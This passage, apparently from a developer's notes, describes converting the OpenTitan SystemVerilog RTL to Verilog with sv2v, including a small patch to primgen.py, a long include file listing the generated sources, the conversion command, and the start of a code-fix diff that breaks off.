--- a/hw/ip/prim/util/primgen.py
+++ b/hw/ip/prim/util/primgen.py
@@ -364,8 +364,8 @@ def _generate_abstract_impl(gapi):
         yaml.dump(abstract_prim_core,
                   f,
                   encoding="utf-8",
-                  default_flow_style=False,
-                  sort_keys=False)
+                  default_flow_style=False)#,
+                  #sort_keys=False)
     print("Core file written to %s" % (abstract_prim_core_filepath, ))
```


Then rtl code will be generated in `build/lowrisc_systems_top_earlgrey_verilator_0.1/src`


There are a lot of declarative statements in systemverilog, and sv2v conversion of these statements will not generate any code. And the source code in the opentitan project lacks the include statement, sv2v will not find some declarations and definitions, which will cause some errors. So I need to create a file includes all the source code, the following is the file(opentitan.sv) I used:


```verilog
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_cipher_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rstmgr_pkg_0.1/rtl/rstmgr_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_pkg_0.1/rtl/ibex_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_top_earlgrey_pinmux_reg_0.1/rtl/autogen/pinmux_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_hmac_0.1/rtl/hmac_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_hmac_0.1/rtl/hmac_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_nmi_gen_0.1/rtl/nmi_gen_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usb_fs_nb_pe_0.1/rtl/usb_consts_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_alert_handler_component_0.1/rtl/alert_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_alert_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_esc_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_top_earlgrey_rv_plic_0.1/rtl/autogen/rv_plic_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_gpio_0.1/rtl/gpio_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_headers_0.1/rtl/tlul_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_0.1/rtl/flash_ctrl_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usbdev_0.1/rtl/usbdev_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_constants_top_pkg_0/top_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rv_timer_0.1/rtl/rv_timer_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_tracer_0.1/rtl/ibex_tracer_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_spi_device_0.1/rtl/spi_device_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_spi_device_0.1/rtl/spi_device_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_uart_0.1/rtl/uart_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_top_earlgrey_alert_handler_reg_0.1/rtl/autogen/alert_handler_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_xbar_main_0.1/tl_main_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/pulp-platform_riscv-dbg_0.1_0/pulp_riscv_dbg/src/dm_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_abstract_prim_pkg_0.1/prim_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_xbar_peri_0.1/tl_peri_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rstmgr_0.1/rtl/rstmgr_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_pwrmgr_pkg_0.1/rtl/pwrmgr_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_pwrmgr_0.1/rtl/pwrmgr_reg_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_pkg_0.1/rtl/flash_ctrl_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_pkg_0.1/rtl/flash_phy_pkg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_pwrmgr_0.1/rtl/pwrmgr_cdc.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_pwrmgr_0.1/rtl/pwrmgr_slow_fsm.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_pwrmgr_0.1/rtl/pwrmgr_wake_info.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_pwrmgr_0.1/rtl/pwrmgr_fsm.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_pwrmgr_0.1/rtl/pwrmgr_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_pwrmgr_0.1/rtl/pwrmgr.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rstmgr_0.1/rtl/rstmgr_ctrl.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rstmgr_0.1/rtl/rstmgr_info.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rstmgr_0.1/rtl/rstmgr_por.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rstmgr_0.1/rtl/rstmgr_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rstmgr_0.1/rtl/rstmgr.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_abstract_flash_0/prim_flash.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_abstract_rom_0/prim_rom.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_abstract_ram_1p_0/prim_ram_1p.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_xbar_peri_0.1/xbar_peri.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_abstract_ram_2p_0/prim_ram_2p.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_abstract_clock_gating_0/prim_clock_gating.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/pulp-platform_riscv-dbg_0.1_0/pulp_riscv_dbg/debug_rom/debug_rom.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_abstract_clock_mux2_0/prim_clock_mux2.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/pulp-platform_riscv-dbg_0.1_0/pulp_riscv_dbg/src/dm_csrs.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/pulp-platform_riscv-dbg_0.1_0/pulp_riscv_dbg/src/dmi_cdc.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/pulp-platform_riscv-dbg_0.1_0/pulp_riscv_dbg/src/dmi_jtag.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/pulp-platform_riscv-dbg_0.1_0/pulp_riscv_dbg/src/dmi_jtag_tap.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/pulp-platform_riscv-dbg_0.1_0/pulp_riscv_dbg/src/dm_mem.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/pulp-platform_riscv-dbg_0.1_0/pulp_riscv_dbg/src/dm_sba.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_xbar_main_0.1/xbar_main.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rv_plic_component_0.1/rtl/rv_plic_target.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rv_plic_component_0.1/rtl/rv_plic_gateway.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_alu.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_multdiv_slow.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_controller.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_counters.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_prefetch_buffer.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_compressed_decoder.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_fetch_fifo.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_pmp.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_multdiv_fast.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_cs_registers.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_core.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_register_file_ff.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_ex_block.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_if_stage.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_wb_stage.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_load_store_unit.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_id_stage.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_decoder.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_top_earlgrey_pinmux_reg_0.1/rtl/autogen/pinmux_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_xilinx_pad_wrapper_0/rtl/prim_xilinx_pad_wrapper.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_hmac_0.1/rtl/sha2.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_hmac_0.1/rtl/sha2_pad.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_hmac_0.1/rtl/hmac_core.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_hmac_0.1/rtl/hmac_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_hmac_0.1/rtl/hmac.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_generic_ram_2p_0/rtl/prim_generic_ram_2p.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_nmi_gen_0.1/rtl/nmi_gen_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_nmi_gen_0.1/rtl/nmi_gen.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_generic_flash_0/rtl/prim_generic_flash.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_prng.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_sbox_lut.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_ctr.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_control.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_cipher_control.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_cipher_core.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_key_expand.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_sbox_canright.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_sub_bytes.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_core.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_mix_single_column.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_shift_rows.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_sbox.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_aes_0.6/rtl/aes_mix_columns.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usb_fs_nb_pe_0.1/rtl/usb_fs_nb_in_pe.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usb_fs_nb_pe_0.1/rtl/usb_fs_nb_out_pe.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usb_fs_nb_pe_0.1/rtl/usb_fs_tx.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usb_fs_nb_pe_0.1/rtl/usb_fs_rx.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usb_fs_nb_pe_0.1/rtl/usb_fs_nb_pe.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usb_fs_nb_pe_0.1/rtl/usb_fs_tx_mux.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_xilinx_rom_0/rtl/prim_xilinx_rom.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_generic_clock_gating_0/rtl/prim_generic_clock_gating.sv"
//`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_systems_top_earlgrey_verilator_0.1/rtl/top_earlgrey_verilator.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_generic_clock_mux2_0/rtl/prim_generic_clock_mux2.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_assert_0.1/rtl/prim_assert.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_diff_decode_0/rtl/prim_diff_decode.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_alert_handler_component_0.1/rtl/alert_handler_reg_wrap.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_alert_handler_component_0.1/rtl/alert_handler.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_alert_handler_component_0.1/rtl/alert_handler_class.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_alert_handler_component_0.1/rtl/alert_handler_esc_timer.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_alert_handler_component_0.1/rtl/alert_handler_ping_timer.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_alert_handler_component_0.1/rtl/alert_handler_accu.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_packer.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_filter_ctr.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_secded_39_32_dec.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_subreg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_arbiter_tree.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_present.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_flop_2sync.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_clock_inverter.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_esc_sender.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_ram_2p_adv.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_esc_receiver.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_arbiter_ppc.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_lfsr.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_filter.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_subreg_ext.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_alert_receiver.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_secded_39_32_enc.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_fifo_async.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_pulse_sync.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_prince.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_sram_arbiter.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_intr_hw.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_ram_2p_async_adv.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_fifo_sync.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_keccak.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_alert_sender.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_systems_top_earlgrey_0.1/rtl/autogen/top_earlgrey.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_systems_top_earlgrey_0.1/rtl/padctl.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_socket_1n_0.1/rtl/tlul_err_resp.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_socket_1n_0.1/rtl/tlul_socket_1n.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rv_dm_0.1/rtl/rv_dm.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_adapter_host_0.1/rtl/tlul_adapter_host.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_sram2tlul_0.1/rtl/sram2tlul.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_generic_pad_wrapper_0/rtl/prim_generic_pad_wrapper.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_adapter_sram_0.1/rtl/tlul_adapter_sram.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_top_earlgrey_rv_plic_0.1/rtl/autogen/rv_plic_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_top_earlgrey_rv_plic_0.1/rtl/autogen/rv_plic.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_gpio_0.1/rtl/gpio_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_gpio_0.1/rtl/gpio.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_socket_m1_0.1/rtl/tlul_socket_m1.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_common_0.1/rtl/tlul_fifo_async.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_common_0.1/rtl/tlul_fifo_sync.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_common_0.1/rtl/tlul_assert.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_common_0.1/rtl/tlul_err.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_common_0.1/rtl/tlul_assert_multiple.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_0.1/rtl/flash_mp.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_0.1/rtl/flash_phy.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_0.1/rtl/flash_phy_core.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_0.1/rtl/flash_rd_ctrl.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_0.1/rtl/flash_ctrl.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_0.1/rtl/flash_prog_ctrl.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_0.1/rtl/flash_erase_ctrl.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_flash_ctrl_0.1/rtl/flash_ctrl_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usbdev_0.1/rtl/usbdev_iomux.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usbdev_0.1/rtl/usbdev_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usbdev_0.1/rtl/usbdev.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usbdev_0.1/rtl/usbdev_usbif.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usbdev_0.1/rtl/usbdev_flop_2syncpulse.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_usbdev_0.1/rtl/usbdev_linkstate.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_xilinx_clock_mux2_0/rtl/prim_xilinx_clock_mux2.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rv_timer_0.1/rtl/rv_timer_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rv_timer_0.1/rtl/rv_timer.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rv_timer_0.1/rtl/timer_core.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_pinmux_component_0.1/rtl/pinmux.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_xilinx_ram_2p_0/rtl/prim_xilinx_ram_2p.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_tracer_0.1/rtl/ibex_tracer.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_spi_device_0.1/rtl/spi_fwmode.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_spi_device_0.1/rtl/spi_fwm_txf_ctrl.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_spi_device_0.1/rtl/spi_fwm_rxf_ctrl.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_spi_device_0.1/rtl/spi_device_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_spi_device_0.1/rtl/spi_device.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_uart_0.1/rtl/uart_rx.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_uart_0.1/rtl/uart_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_uart_0.1/rtl/uart.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_uart_0.1/rtl/uart_tx.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_uart_0.1/rtl/uart_core.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_generic_rom_0/rtl/prim_generic_rom.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_top_earlgrey_alert_handler_reg_0.1/rtl/autogen/alert_handler_reg_top.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_tlul_adapter_reg_0.1/rtl/tlul_adapter_reg.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_xilinx_clock_gating_0/rtl/prim_xilinx_clock_gating.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_generic_ram_1p_0/rtl/prim_generic_ram_1p.sv"
`include "build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_rv_core_ibex_0.1/rtl/rv_core_ibex.sv"
```


Then use the following command to transcode to get verilog.


```
# "SYNTHESIS" macro is used for conditional compilation to remove some non-synthesizable code
sv2v -DSYNTHESIS -I build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_assert_0.1/rtl opentitan.sv > opentitan.v
```


## code fix


The code generated by sv2v cannot be used directly, and there are some problems that need to be fixed. The following are my modifications:


```diff
diff -r lowrisc_systems_top_earlgrey_verilator_0.1 ~/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1
diff -r lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_id_stage.sv /home/merle/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_core_0.1/rtl/ibex_id_stage.sv
958c958
<
---
> /*
